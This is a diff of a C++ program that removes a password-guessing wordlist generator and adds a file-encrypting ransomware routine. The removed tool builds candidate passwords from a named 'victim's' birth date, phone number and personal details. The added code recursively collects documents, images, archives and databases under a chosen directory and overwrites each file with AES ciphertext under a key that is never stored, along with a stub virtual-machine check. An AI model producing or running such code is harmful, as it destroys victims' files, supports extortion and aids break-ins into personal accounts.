@@ -1,122 +1,146 @@
 #include <iostream>
-#include <vector>
 #include <string>
-#include <cmath>
+#include <vector>
 #include <sstream>
 #include <fstream>
+#include <algorithm>
+#include <iterator>
+#include <stdint.h>
+#include <iomanip>
+#include <filesystem> 
+#include <cstdlib>
+#include <ctime> 
+#include "include/plusaes.hpp"
+#include "include/SHA256.hpp"
 
-class CombinationGenerator {
-public:
-    CombinationGenerator(const std::vector<std::string>& input , const std::vector<std::string>& input2 ) 
-    : set(input) , INFOS(input2) {
-        generateDefaultCombinations();
-        generateAllCombinations();
-    }
-
-    void writeAllCombinations(){
-        int flag = 0;
-        std::string filename = set[0]+set[1]+".txt";
-        std::fstream output(filename , std::ios::out);
-        if (!output)
-            std::cerr << "Error: Writting to the file " << filename << "\n";
-        for (auto combo : combinations){
-            if (combo != "" )
-                output << combo << "\n";
-                flag++;
-        }
-        std::cout << flag << " passwords were written to " << filename << "\n";
-        std::cout << "*** DONE ***\n";
-   }
-
-private:
-    std::vector<std::string> set;
-    std::vector<std::string> combinations;
-    std::vector<std::string> INFOS;
-
-    std::string capitalize(const std::string& str){
-        return ((char)toupper(str[0])+ str.substr(1,size(str)-1) );
-    }
-
-    void generateDefaultCombinations() {
-        const std::string& name = set[0];
-        const std::string& surname = set[1];
-        const std::string& date = set[2];
-        const std::string& month = set[3];
-        const std::string& year = set[4];
-        const std::string& phone = set[5];
-
-        for (const std::string symbol : {"!", "_" ,"@", "#", "$", "%", "^", "&", "*" , "@@" }) {
-			combinations.push_back(name + symbol + date + month );     
-            combinations.push_back(capitalize(name) + symbol + date + month );    
-			combinations.push_back(name + symbol + surname + year);   
-            combinations.push_back(capitalize(name) + symbol + surname + year);   
-            combinations.push_back(capitalize(name) + symbol + capitalize(surname) + year );   
-            combinations.push_back(name + symbol + "123"); 
-            combinations.push_back(capitalize(name) + symbol + "123");
-            combinations.push_back(name + symbol + year);
-            combinations.push_back(capitalize(name) + symbol + year);
-            combinations.push_back(name + symbol + surname);
-            combinations.push_back(capitalize(name) + symbol + capitalize(surname));
-            combinations.push_back(symbol + symbol + name + year);
-            combinations.push_back(name + surname + symbol + year);
-            if ( std::stoi(date) < 10 && std::stoi(month) < 10 && std::stoi(year) < 2010 )
-                combinations.push_back(name + surname + symbol + date + month + year[3]);
-            
-        }
-    }
-
-    void generateAllCombinations() {
-        unsigned int power = 1 << INFOS.size(); // 2^size
-
-        for (unsigned int i = 0; i < power; i++) {
-            std::string word;
-            for (unsigned int j = 0; j < INFOS.size(); j++) {
-                if (i & (1 << j)) {
-                    word += INFOS[j];
-                }
-            }
-            combinations.push_back(word);
-        }
-    }
+const std::vector<std::string> extensions = {
+    ".doc", ".docx", ".odt", ".pdf", ".txt", ".rtf", ".tex", ".wps", ".xls", ".xlsx", 
+    ".ods", ".csv", ".ppt", ".pptx", ".odp", ".jpg", ".jpeg", ".png", ".gif", ".bmp", 
+    ".tiff", ".svg", ".mp3", ".wav", ".aac", ".flac", ".m4a", ".mp4", ".avi", ".mov", 
+    ".wmv", ".mkv", ".flv", ".zip", ".rar", ".7z", ".tar", ".gz", ".bak", ".tmp", 
+    ".old", ".db", ".sql", ".mdb", ".accdb", ".html", ".htm", ".css", ".js", ".py", 
+    ".java", ".c", ".cpp", ".epub", ".mobi", ".azw", ".psd", ".ai"
 };
+std::vector<std::string> files;
 
-void gatherInfo(std::vector<std::string>& set , std::vector<std::string>& INFOS) {
-    std::string name, surname, date, month, year, phoneNumber , info , temp;
+std::string aes_keygen() {
+    //Random key gen 
+    std::srand(static_cast<unsigned int>(std::time(0)));
+    char input[33];
+    const char choices[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_+/";
+    int i = 0;
+    while ( i < 32 ){
+        int index = rand() % (sizeof(choices) - 1);
+        input[i] = choices[index];
+        i++;
+    }
+    input[i] = '\0';
+    // Random key generated
 
-    std::cout << "Enter victim name (separated by space): ";
-    std::cin >> name >> surname;
-    set.push_back(name);
-    set.push_back(surname);
+    SHA256 sha256; 
+    std::vector<uint8_t> hash = sha256.hash(input);
 
-    std::cout << "Enter date of birth (day month year): ";
-    std::cin >> date >> month >> year;
-    set.push_back(date);
-    set.push_back(month);
-    set.push_back(year);
+    std::ostringstream oss;
+    for (uint8_t byte : hash) {
+        oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
+    }
+    return oss.str().substr(0, 32);
+}
 
-    std::cout << "Enter victim phone number: ";
-    std::cin >> phoneNumber;
-    set.push_back(phoneNumber);
-	
-	std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+std::string base64_encode(const std::vector<unsigned char>& data) {
+    static const char* base64_chars = 
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "abcdefghijklmnopqrstuvwxyz"
+        "0123456789+/";
 
-    std::cout << "Enter extra info (separated by space) : " ;
-	std::getline(std::cin , info) ;
-	std::stringstream obj(info);
+    std::string encoded;
+    int val = 0;
+    int valb = -6;
 
-	while ( obj >> temp)
-		INFOS.push_back(temp);
-	temp = "";
+    for (unsigned char c : data) {
+        val = (val << 8) + c;
+        valb += 8;
+        while (valb >= 0) {
+            encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
+            valb -= 6;
+        }
+    }
+    while (valb > -6) {
+        encoded.push_back('=');
+        valb -= 6;
+    }
+
+    return encoded;
+}
+
+std::string encryptor(const std::string& raw_data , std::string& key_str) {
+    const std::vector<unsigned char> key(key_str.begin(), key_str.end());
+    const unsigned char iv[16] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+                                    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F };
+    const unsigned long encrypted_size = plusaes::get_padded_encrypted_size(raw_data.size());
+    std::vector<unsigned char> encrypted(encrypted_size);
+    
+    plusaes::encrypt_cbc((unsigned char*)raw_data.data(), raw_data.size(), key.data(), key.size(), &iv, encrypted.data(), encrypted.size(), true);
+    return base64_encode(encrypted);
+}
+
+bool encrypt(const std::string& file , std::string& key_str) {
+    std::ifstream input(file, std::ios::binary);
+    if (!input) {
+        std::cerr << "Failed to open file: " << file << std::endl;
+        return false;
+    }
+
+    std::string file_contents((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
+    input.close();
+
+    std::string encrypted_content = encryptor(file_contents , key_str);
+
+    std::ofstream output(file, std::ios::binary | std::ios::trunc);
+    if (!output) {
+        std::cerr << "Failed to write to file: " << file << std::endl;
+        return false;
+    }
+
+    output << encrypted_content;
+    output.close();
+
+    return true;
+}
+
+void directories(const std::string& file_path) {
+    for (const auto& file : std::filesystem::recursive_directory_iterator(file_path)) {
+        std::filesystem::path p1(file);
+        if (std::find(extensions.begin(), extensions.end(), p1.extension()) != extensions.end()) {
+            files.push_back(p1.string());
+        }
+    }
+}
+
+bool vm_check() {
+#ifdef _WIN32
+    return true;
+#else
+    return false;
+#endif
 }
 
 int main() {
-    std::vector<std::string> set;
-    std::vector <std::string> INFOS;
-    gatherInfo(set , INFOS);
-    
-    CombinationGenerator generator(set,INFOS);
-    generator.writeAllCombinations();
+    if (!vm_check){
+        return 1;
+    }
+    std::string path;
+    std::cout << "Enter the directory path to scan for files: ";
+    std::getline(std::cin, path);
+    std::string key_str = aes_keygen();
+    directories(path);
+    for (const auto& file : files) {
+        if (encrypt(file , key_str)) {
+            std::cout << "Encrypted: " << file << "\n";
+        } else {
+            std::cerr << "Failed to encrypt: " << file << "\n";
+        }
+    }
 
     return 0;
 }
-
